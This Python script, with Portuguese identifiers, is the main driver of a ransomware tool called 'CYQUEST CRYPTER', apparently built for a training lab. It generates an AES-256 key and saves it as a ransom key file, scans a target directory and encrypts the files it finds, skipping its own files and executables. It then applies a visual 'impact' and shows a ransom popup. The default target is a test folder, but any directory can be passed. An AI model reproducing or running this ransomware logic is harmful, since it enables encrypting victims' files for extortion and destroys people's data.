#!/usr/bin/env python3
import os
import sys
import time
from pathlib import Path
import argparse


from varredura_de_arquivo import escanear_diretorio
from criptografia import criptografar_arquivo
from interface import injetar_impacto_visual, disparar_popup


EXTENSOES_IGNORADAS = {
    ".cyquest",   
    ".key",       
    ".py",        
    ".exe",
    ".dll"
}

def deve_ignorar(caminho: Path):
    """Evita criptografar arquivos sensíveis do próprio laboratório"""
    if caminho.suffix.lower() in EXTENSOES_IGNORADAS:
        return True
    if "chave_resgate.key" in caminho.name:
        return True
    return False

def main():
    diretorio_padrao = os.path.join(os.path.expanduser("~"), "Documents", "laboratorio_teste")

    parser = argparse.ArgumentParser(description="Crypter - Criptografa arquivos e gera nota de resgate")
    parser.add_argument("diretorio", nargs="?", default=diretorio_padrao,
                        help="Diretório alvo (padrão: ~/Documents/laboratorio_teste)")
    args = parser.parse_args()

    diretorio_alvo = os.path.abspath(args.diretorio)
    if not os.path.exists(diretorio_alvo):
        print(f"[-] Diretório não encontrado: {diretorio_alvo}")
        sys.exit(1)

    print("\n===== CYQUEST CRYPTER =====\n")

    inicio = time.time()


    chave_mestra = os.urandom(32)
    with open("chave_resgate.key", "wb") as key_file:
        key_file.write(chave_mestra)
    print("[+] Chave AES-256 gerada e salva em chave_resgate.key")


    print("[*] Escaneando diretório...")
    arquivos_encontrados = escanear_diretorio(diretorio_alvo)

    total_encontrados = 0
    total_criptografados = 0
    erros = 0


    for categoria, lista_paths in arquivos_encontrados.items():
        if not lista_paths:
            continue
        print(f"\n[+] Categoria: {categoria} ({len(lista_paths)} arquivos)")
        for caminho in lista_paths:
            total_encontrados += 1
            if deve_ignorar(caminho):
                print(f"[IGNORADO] {caminho.name}")
                continue
            try:
                print(f"[CRIPT] {caminho.name}")
                criptografar_arquivo(str(caminho), chave_mestra)
                total_criptografados += 1
            except Exception as e:
                print(f"[ERRO] {caminho.name}: {e}")
                erros += 1


    print("\n[*] Aplicando impacto visual...")
    injetar_impacto_visual(diretorio_alvo)
    disparar_popup()


    print("\n" + "="*40)
    print(f"Total de arquivos encontrados: {total_encontrados}")
    print(f"Total criptografados: {total_criptografados}")
    print(f"Erros: {erros}")
    print(f"Tempo total: {time.time() - inicio:.2f} segundos")
    print("[+] Processo concluído!")

if __name__ == "__main__":
    main()